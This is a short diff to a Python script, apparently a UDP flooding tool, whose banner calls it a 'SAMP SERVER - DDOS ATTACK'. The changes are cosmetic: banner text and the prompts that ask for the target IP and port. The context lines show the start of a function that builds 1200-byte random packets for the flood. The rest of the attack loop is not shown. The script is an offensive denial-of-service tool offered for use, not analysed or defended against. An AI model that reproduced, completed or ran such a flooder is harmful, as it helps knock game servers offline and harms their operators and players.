@@ -59,19 +59,15 @@ import socket
 import threading
 
 print("")
-print(""""       | BY. PH ~DHRUBO |   """)
+print("""     | BY. PH ~DHRUBO |   """)
 
 print("")
 print("""  
-	    | SAMP SERVER - DDOS ATTACK | 
+         | SAMP SERVER - DDOS ATTACK | 
 """)
 print("")
-print("""
-	    - MADE BY DHRUBO -
-""")
-print("")
-ip = input(" IP : ")
-port = input(" PORT : ")
+ip = input(" IP : => ")
+port = input(" PORT : => ")
 
 def udpsirisakz():
 	data = random._urandom(1200)
